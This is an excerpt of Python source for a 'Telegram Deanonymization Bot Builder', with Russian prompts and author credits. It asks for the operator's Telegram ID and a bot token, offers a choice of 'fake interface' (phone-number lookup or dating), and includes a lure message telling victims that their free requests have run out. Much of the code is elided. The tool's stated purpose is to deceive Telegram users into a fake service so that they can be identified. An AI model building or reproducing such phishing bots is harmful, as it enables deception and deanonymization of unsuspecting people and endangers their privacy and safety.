...
print('╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝')
print(Fore.RED + '-----------------------------------------')
print(Fore.RED + '|' + Fore.CYAN + " Telegram Deanonymization Bot Builder  " + Fore.RED + '|')
print(Fore.RED + '|' + Fore.CYAN + "       Developer: @mickacya            " + Fore.RED + '|')
print(Fore.RED + '|' + Fore.CYAN + "      Channel: @mickacyablog           " + Fore.RED + '|')
print(Fore.RED + '-----------------------------------------')
userid = input(Fore.CYAN + "Введите свой Telegram ID: ")
token = input(Fore.RED + "Введите токен бота: ")
print(Fore.CYAN + '''
[1] Пробив по номеру
...
[4] Знакомства
        ''')
choice = input(Fore.RED + "Выберите вариант фейк интерфейса: ")
...
@bot.message_handler(commands=['mickacyadev'])
def start(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @mickayca. Канал: @mickacyablog') 
...
def proc2(message):
	try:
		...
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов!
...
@bot.message_handler(commands=['mickacyadev'])
def start(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @mickacya. Канал: @mickacyablog') 
...
@bot.message_handler(commands=['mickacyadev'])
def start(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @mickacya. Канал: @mickacya') 
